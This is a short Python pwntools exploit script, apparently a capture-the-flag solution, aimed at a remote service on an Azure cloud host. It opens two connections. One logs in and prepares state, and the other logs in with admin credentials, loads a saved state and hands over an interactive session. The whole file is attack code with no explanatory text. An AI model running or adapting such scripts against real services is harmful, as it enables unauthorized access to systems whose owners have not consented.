# type: ignore
from pwn import *   


tu = ("darkpaper.eastasia.cloudapp.azure.com", 1145)
user_a = remote(*tu)


user_a.recv()
user_a.sendline(b"log in#a a")
user_a.recv()
user_a.sendline(b"create#2")
user_a.recv()
user_a.sendline(b"prepare#")

user_c = remote(*tu)

user_c.recv()
user_c.sendline(b"log in#admin admin")
user_c.sendline(b"load#15 before_joker")


user_c.interactive()



user_a.close()
